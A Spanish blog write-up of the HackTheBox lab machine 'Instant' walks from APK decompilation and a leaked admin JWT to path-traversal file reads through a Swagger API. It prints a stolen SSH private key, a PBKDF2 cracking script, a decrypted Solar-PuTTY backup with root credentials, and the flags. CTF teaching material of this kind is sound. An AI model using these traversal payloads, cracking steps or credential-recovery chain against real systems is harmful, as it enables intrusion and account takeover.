+++ 
draft = false
date = 2026-10-18T02:02:48Z
title = "Instant Machine - HackTheBox"
description = "Esta es una máquina de nivel medio de la plataforma HackTheBox."
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

---
- Tags: #Machine #Medium  #Linux #APK #LFI #Swagger #SolarPutty
---
# Introducción

Instant es una máquina Linux de HackTheBox de dificultad media. El vector de explotación parte del análisis de una aplicación Android (`.apk`) obtenida desde el servicio web, lo que permite descubrir subdominios, endpoints y un token JWT filtrado. A partir de ahí se llega a una API documentada con Swagger, en la que se explota una vulnerabilidad de Local File Inclusion (LFI) para filtrar la clave SSH privada de un usuario del sistema y obtener acceso inicial. La escalada de privilegios se logra mediante el análisis de una base de datos SQLite, el crackeo de hashes PBKDF2 y el desencriptado de un backup de sesiones de Solar-PuTTY que contiene las credenciales de `root`.

# Enumeración Nmap

Se realiza un escaneo de puertos abiertos.

```bash
nmap -p- --open -sS --min-rate 2000 -vvv -n -Pn 10.129.231.155 -oG allPorts
```

El resultado del escaneo revela únicamente 2 puertos abiertos, correspondientes al 22 y al 80. A continuación se realiza un escaneo de versiones y servicios sobre ambos puertos.

```bash
nmap -p22,80 -sCV 10.129.231.155 -oN portServices
```

```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-17 18:20 -0400
Nmap scan report for instant.htb (10.129.231.155)
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Instant Wallet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

Del resultado solo obtenemos los servicios que corren detrás de los puertos; además confirmamos que `apache` está activo en el puerto 80.

Para profundizar el análisis utilizaremos `whatweb`, de la siguiente forma:

```bash
whatweb http://10.129.231.155
```

```
http://10.129.231.155 [301 Moved Permanently] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.231.155], RedirectLocation[http://instant.htb/], Title[301 Moved Permanently]
http://instant.htb/ [200 OK] Apache[2.4.58], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[support@instant.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.231.155], JQuery[3.2.1], Script, Title[Instant Wallet]
```

En el resultado identificamos el dominio `instant.htb`, por lo cual procedemos a agregarlo a nuestro `/etc/hosts`.

```bash
echo '10.129.231.155 instant.htb' | sudo tee -a /etc/hosts
```

# Enumeración HTTP

Al ingresar a la página web, tenemos lo siguiente:

<img src="/images/Pasted image 20261017195716.png" style="width:100%; height:auto; display:block; margin:auto;">

Existe un endpoint llamado `downloads` que permite descargar un archivo `.apk`; procedemos a descargarlo para analizarlo.

<img src="/images/Pasted image 20261017195912.png" style="width:100%; height:auto; display:block; margin:auto;">

Al ejecutar `file`, obtenemos lo siguiente:

```bash
file instant.apk 
instant.apk: Android package (APK), with gradle app-metadata.properties, with APK Signing Block
```

Descompilamos el código con `jadx` para identificar endpoints de interés:

```bash
jadx /home/celero0/HTB/instant/instant.apk -d /home/celero0/HTB/instant/instant_src
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 86
```

Sobre el código descompilado podemos buscar endpoints, dominios o datos de configuración.

Para ello utilizaremos el siguiente comando:

```bash
rg -n -i 'https?://|wss?://|api[_-]?key|client[_-]?secret|firebase|graphql|retrofit|okhttp' instant_src >> filter
```

Al revisar el archivo `filter` y filtrarlo con `grep` por `instant.htb`, encontramos el subdominio `mywalletv1.instant.htb`. Además, identificamos un `JWT`:

```bash
"Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

que corresponde al endpoint `http://mywalletv1.instant.htb/api/v1/view/profile`.

<img src="/images/Pasted image 20261017202227.png" style="width:100%; height:auto; display:block; margin:auto;">

Ampliando la búsqueda con `rg` para incluir también `instant.htb`:

```bash
rg -n -i 'https?://|wss?://|api[_-]?key|client[_-]?secret|firebase|graphql|retrofit|okhttp|instant.htb' instant_src >> filter2
```

y nuevamente filtrando con `grep` por `instant.htb`:

```bash
cat filter2 | grep "instant.htb"
```

encontramos un segundo subdominio: `swagger-ui.instant.htb`.

```bash
cat filter2 | grep "instant.htb"
instant_src/resources/res/xml/network_security_config.xml:4:        <domain includeSubdomains="true">mywalletv1.instant.htb
instant_src/resources/res/xml/network_security_config.xml:6:        <domain includeSubdomains="true">swagger-ui.instant.htb
instant_src/resources/res/layout/activity_forgot_password.xml:20:            android:text="Please contact support@instant.htb to have your account recovered"
```

Agregamos los nuevos subdominios, quedando de la siguiente forma:

```bash
cat /etc/hosts | tail -n 1
10.129.231.155 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb
```

El subdominio `swagger-ui.instant.htb` aloja la interfaz web de Swagger, que permite visualizar la documentación de la API y explorar sus endpoints disponibles.

<img src="/images/Pasted image 20261017212256.png" style="width:100%; height:auto; display:block; margin:auto;">

En `Authorize` podemos ingresar la cookie identificada en el código del APK.

<img src="/images/Pasted image 20261017212335.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotando LFI

Encontramos un endpoint que permite leer `logs` del sistema, el cual solicita una ruta como parámetro:

<img src="/images/Pasted image 20261017212512.png" style="width:100%; height:auto; display:block; margin:auto;">

Al enviar como ruta `/../../../etc/passwd`, confirmamos que tenemos acceso de lectura.

<img src="/images/Pasted image 20261017212622.png" style="width:100%; height:auto; display:block; margin:auto;">

Identificamos la existencia del usuario `shirohige`, por lo que intentamos leer su `id_rsa` mediante la ruta `/../../../home/shirohige/.ssh/id_rsa`.

Obtenemos el `id_rsa`, aunque con formato incorrecto debido a caracteres adicionales:

<img src="/images/Pasted image 20261017212750.png" style="width:100%; height:auto; display:block; margin:auto;">

# Acceso inicial

Una vez corregido el formato, el `id_rsa` queda de la siguiente forma:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Guardamos la clave en nuestra máquina atacante y nos conectamos por `SSH` a la máquina víctima como el usuario `shirohige`:

```bash
ssh -i id_rsa shirohige@instant.htb
The authenticity of host 'instant.htb (10.129.231.155)' can't be established.
ED25519 key fingerprint is: SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? YES
Warning: Permanently added 'instant.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Oct 18 00:29:13 2026 from 10.10.14.48
shirohige@instant:~$
```

Con acceso al sistema, podemos leer la flag `user.txt`:

```bash
cat user.txt
a4be6ccb121f318134bff469d0583fef
```

# Escalada de privilegios

Buscando una vía de movimiento lateral o escalar privilegios, encontramos el archivo `instant.db`.

```bash
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ ls
instant.db
```

Levantamos un servicio web con `python` de la siguiente forma:

```bash
python3 -m http.server 8081
```

y desde nuestra máquina atacante descargamos el archivo con `wget`.

```bash
wget http://instant.htb:8081/instant.db
--2026-10-17 21:08:19--  http://instant.htb:8081/instant.db
Resolving instant.htb (instant.htb)... 10.129.231.155
Connecting to instant.htb (instant.htb)|10.129.231.155|:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36864 (36K) [application/octet-stream]
Saving to: ‘instant.db’

instant.db                                      100%[====================================================================================================>]  36.00K  --.-KB/s    in 0.1s    

2026-10-17 21:08:19 (254 KB/s) - ‘instant.db’ saved [36864/36864]
```

Con `sqlite3` revisamos las tablas y extraemos los datos de usuarios, encontrando dos hashes:

```bash
sqlite3 instant.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
wallet_transactions  wallet_users         wallet_wallets
sqlite> select * from wallet_users;
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
```

Estos hashes corresponden al formato PBKDF2-HMAC-SHA256 de Werkzeug, utilizado habitualmente por aplicaciones Python con Flask.

Para descifrarlos, guardamos el hash en un archivo llamado `hash.txt` y empleamos el siguiente script en `python`, que realiza un ataque de diccionario contra `rockyou.txt`:

```python
import hashlib

h = "pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed"

prefix, salt, target = h.split("$")
iterations = int(prefix.split(":")[2])
salt_bytes = salt.encode()
target = target.lower()

with open("/usr/share/wordlists/rockyou.txt", "rb") as f:
    for line in f:
        password = line.rstrip(b"\r\n")
        dk = hashlib.pbkdf2_hmac("sha256", password, salt_bytes, iterations)
        if dk.hex() == target:
            print("Contraseña encontrada:", password.decode(errors="replace"))
            break
```

Al ejecutarlo obtenemos el siguiente resultado:

```bash
python3 decrypt.py 
Contraseña encontrada: estrella
```

Dado que no sabemos a qué corresponde esta contraseña, continuamos enumerando archivos del sistema de los que seamos propietarios.

```bash
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ find / -type f -user shirohige 2>/dev/null | grep -vE "home|sys|proc"
/opt/backups/Solar-PuTTY/sessions-backup.dat
```

Encontramos el archivo `/opt/backups/Solar-PuTTY/sessions-backup.dat`.

Al buscar en Google qué es Solar-PuTTY, obtenemos la siguiente información:

```
Solar-PuTTY es un cliente SSH gratuito para Windows desarrollado por SolarWinds que amplía y mejora las funciones del conocido emulador de terminal PuTTY
```

Investigando qué puede hacerse con el archivo `sessions-backup.dat`, confirmamos que corresponde a una copia de seguridad de las sesiones de Solar-PuTTY, y que para recuperar esa información —incluidas las contraseñas— se puede utilizar una herramienta llamada `Solar PuTTY Decryptor`.

Clonamos el proyecto con el siguiente comando:

```bash
git clone https://github.com/Wind010/SolarPuttyDecryptor.git
```

Para desencriptar el contenido, usamos el siguiente comando junto con la contraseña `estrella` obtenida anteriormente:

```bash
python3 SolarPuttyDecryptor.py sessions-backup.dat --password 'estrella'
```

Esto expone la información de la sesión, incluidas las credenciales:

```bash
"Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
```

Con las credenciales de `root`, cambiamos de usuario y obtenemos privilegios máximos para leer la flag `root.txt`:

```bash
su root
Password: 
root@instant:/home/shirohige# cat /root/root.txt
f882b29ff8a12c0b34a0b4a3c40e4792
```

# Conclusión

En Instant, el punto de partida no está en el servicio web directamente, sino en la aplicación móvil que este distribuye: su ingeniería inversa con `jadx` revela subdominios ocultos, un endpoint de documentación Swagger y un JWT embebido que permite autenticarse como administrador en la API. Desde ahí, un endpoint de lectura de logs resulta vulnerable a Local File Inclusion, lo que permite filtrar `/etc/passwd` y, a partir del usuario identificado, la clave privada SSH de `shirohige`, logrando el acceso inicial a la máquina.

Para la escalada a `root`, la base de datos SQLite de la aplicación expone hashes PBKDF2-HMAC-SHA256 que, al ser crackeados mediante ataque de diccionario con `rockyou.txt`, entregan una contraseña reutilizada en otro contexto: el cifrado de un backup de sesiones de Solar-PuTTY propiedad de `shirohige`. Al desencriptar ese backup con `Solar PuTTY Decryptor` se obtienen las credenciales de `root`, con las que se completa el compromiso total del sistema.

En resumen, la máquina pone a prueba la ingeniería inversa de aplicaciones Android, la enumeración de subdominios y APIs documentadas, la explotación de LFI, y la reutilización de contraseñas entre distintos servicios para escalar privilegios.
